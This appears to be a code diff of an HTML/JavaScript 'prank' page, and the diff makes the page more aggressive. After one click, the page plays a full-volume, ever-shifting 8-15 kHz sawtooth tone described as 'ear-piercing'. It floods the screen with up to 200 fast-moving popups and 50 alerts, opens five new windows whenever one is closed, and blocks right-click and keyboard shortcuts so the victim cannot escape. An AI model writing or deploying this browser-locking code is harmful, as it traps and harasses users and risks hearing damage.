@@ -8,14 +8,10 @@
 </head>
 <body>
     <div class="container">
-        <h1>🎉 Welcome! 🎉</h1>
-        <p>Click the button below for a surprise!</p>
-        <button id="prankButton" class="prank-button">✨ CLICK ME ✨</button>
+        <h1>WELCOME</h1>
+        <p>Click the button below for a surprise</p>
+        <button id="prankButton" class="prank-button">CLICK ME</button>
     </div>
-
-    <audio id="music" loop>
-        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
-    </audio>
 
     <script>
         const button = document.getElementById('prankButton');
@@ -24,26 +20,26 @@
         const maxPopups = 200;
 
         const popupMessages = [
-            "🎵 SURPRISE! 🎵",
-            "🎊 CONGRATULATIONS! 🎊",
-            "🌟 YOU WON! 🌟",
-            "🎁 FREE GIFT! 🎁",
-            "🔔 IMPORTANT ALERT! 🔔",
-            "⚠️ WARNING! ⚠️",
-            "📢 ANNOUNCEMENT! 📢",
-            "🎪 PARTY TIME! 🎪",
-            "🚨 EMERGENCY! 🚨",
-            "💥 BOOM! 💥",
-            "🎉 HAPPY DAY! 🎉",
-            "🌈 RAINBOWS! 🌈",
-            "🦄 UNICORNS! 🦄",
-            "🍕 PIZZA TIME! 🍕",
-            "🎮 GAME OVER! 🎮",
-            "📱 NEW MESSAGE! 📱",
-            "🔔 NOTIFICATION! 🔔",
-            "⭐ WISH GRANTED! ⭐",
-            "🎭 DRAMA! 🎭",
-            "🚀 BLAST OFF! 🚀"
+            "SURPRISE",
+            "CONGRATULATIONS",
+            "YOU WON",
+            "FREE GIFT",
+            "IMPORTANT ALERT",
+            "WARNING",
+            "ANNOUNCEMENT",
+            "PARTY TIME",
+            "EMERGENCY",
+            "BOOM",
+            "HAPPY DAY",
+            "RAINBOWS",
+            "UNICORNS",
+            "PIZZA TIME",
+            "GAME OVER",
+            "NEW MESSAGE",
+            "NOTIFICATION",
+            "WISH GRANTED",
+            "DRAMA",
+            "BLAST OFF"
         ];
 
         const activePopups = [];
@@ -68,40 +64,48 @@
                                 align-items: center;
                                 height: 100vh;
                                 margin: 0;
-                                background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
-                                background-size: 400% 400%;
-                                animation: gradient 3s ease infinite;
-                            }
-                            @keyframes gradient {
-                                0% { background-position: 0% 50%; }
-                                50% { background-position: 100% 50%; }
-                                100% { background-position: 0% 50%; }
+                                background: #333333;
                             }
                             h1 {
-                                color: white;
-                                text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+                                color: #999999;
                                 font-size: 24px;
+                                text-align: center;
+                            }
+                            p {
+                                color: #666666;
                                 text-align: center;
                             }
                         </style>
                     </head>
                     <body>
                         <h1>${randomMessage}</h1>
-                        <p style="color: white; text-align: center;">Popup #${popupCount} of ${maxPopups}</p>
-                        <p style="color: white; text-align: center; font-size: 12px;">You cannot close this window!</p>
+                        <p>Popup #${popupCount} of ${maxPopups}</p>
+                        <p style="font-size: 12px;">You cannot close this window</p>
                     </body>
                     </html>
                 `);
                 
-                // Make popup harder to close
+                // Make popup extremely hard to close
                 popup.onbeforeunload = function() {
                     return "Are you sure you want to leave?";
                 };
                 
-                // Try to prevent closing
+                // Try to prevent closing and spawn new windows
                 popup.onunload = function() {
-                    window.open('', '_blank', 'width=400,height=300');
+                    for(let i = 0; i < 5; i++) {
+                        window.open('', '_blank', 'width=400,height=300');
+                    }
                 };
+                
+                // Prevent right-click
+                popup.document.addEventListener('contextmenu', e => e.preventDefault());
+                
+                // Prevent keyboard shortcuts
+                popup.document.addEventListener('keydown', e => {
+                    if(e.ctrlKey || e.altKey || e.metaKey) {
+                        e.preventDefault();
+                    }
+                });
                 
                 // Position popup randomly
                 const randomX = Math.random() * (screen.width - 400);
@@ -121,73 +125,61 @@
         }
 
         function createAlerts() {
-            for (let i = 0; i < 30; i++) {
+            for (let i = 0; i < 50; i++) {
                 setTimeout(() => {
                     const randomMessage = popupMessages[Math.floor(Math.random() * popupMessages.length)];
-                    alert(`${randomMessage}\n\nAlert #${i + 1} of 30`);
-                }, i * 300);
-            }
-        }
-
-        const activeModals = [];
-
-        function createModals() {
-            for (let i = 0; i < 20; i++) {
-                setTimeout(() => {
-                    const modal = document.createElement('div');
-                    modal.className = 'modal moving-modal';
-                    modal.style.left = Math.random() * 80 + 10 + '%';
-                    modal.style.top = Math.random() * 80 + 10 + '%';
-                    modal.innerHTML = `
-                        <div class="modal-content">
-                            <h2>${popupMessages[Math.floor(Math.random() * popupMessages.length)]}</h2>
-                            <p>Modal #${i + 1} - Cannot be closed!</p>
-                        </div>
-                    `;
-                    document.body.appendChild(modal);
-                    activeModals.push(modal);
+                    alert(`${randomMessage}\n\nAlert #${i + 1} of 50`);
                 }, i * 200);
             }
         }
 
-        function moveModals() {
-            activeModals.forEach(modal => {
-                modal.style.left = Math.random() * 80 + 10 + '%';
-                modal.style.top = Math.random() * 80 + 10 + '%';
-            });
+        function playHighPitchNoise() {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.type = 'sawtooth';
+            oscillator.frequency.setValueAtTime(8000, audioContext.currentTime);
+            oscillator.frequency.exponentialRampToValueAtTime(15000, audioContext.currentTime + 0.1);
+            
+            gainNode.gain.setValueAtTime(1, audioContext.currentTime);
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.start();
+            
+            // Modulate frequency for more piercing effect
+            setInterval(() => {
+                const freq = 8000 + Math.random() * 7000;
+                oscillator.frequency.setValueAtTime(freq, audioContext.currentTime);
+            }, 50);
         }
 
         button.addEventListener('click', () => {
-            // Play music at maximum volume
-            music.volume = 1.0;
-            music.play().catch(e => console.log('Audio play failed:', e));
+            // Play ear-piercing high-pitch noise
+            playHighPitchNoise();
             
             // Create massive amounts of popups
-            for (let i = 0; i < 100; i++) {
-                setTimeout(createPopup, i * 100);
+            for (let i = 0; i < 150; i++) {
+                setTimeout(createPopup, i * 50);
             }
             
             // Create alerts immediately
-            setTimeout(createAlerts, 500);
-            
-            // Create modals immediately
-            setTimeout(createModals, 300);
+            setTimeout(createAlerts, 200);
             
             // Keep spawning popups continuously
             setInterval(() => {
                 if (popupCount < maxPopups) {
                     createPopup();
                 }
-            }, 200);
+            }, 100);
             
             // Move popups extremely fast
-            setInterval(movePopups, 30);
-            
-            // Move modals extremely fast
-            setInterval(moveModals, 30);
+            setInterval(movePopups, 20);
             
             // Change button text
-            button.textContent = '🎉 TOO LATE! 🎉';
+            button.textContent = 'TOO LATE';
             button.disabled = true;
         });
     </script>
